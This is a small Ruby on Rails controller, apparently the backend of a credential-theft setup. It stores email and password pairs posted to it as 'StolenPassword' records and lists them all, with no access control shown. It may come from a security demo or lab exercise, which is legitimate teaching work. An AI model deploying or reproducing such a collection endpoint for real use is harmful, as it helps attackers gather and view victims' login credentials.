class StolenPasswordsController < ApplicationController

  def index
    @stolen_passwords = StolenPassword.all
  end

  def new
    @stolen_password = StolenPassword.new
  end

  def create
    @stolen_password = StolenPassword.new(email: params[:email], password: params[:password])
    @stolen_password.save
    redirect_to stolen_passwords_path
  end

end
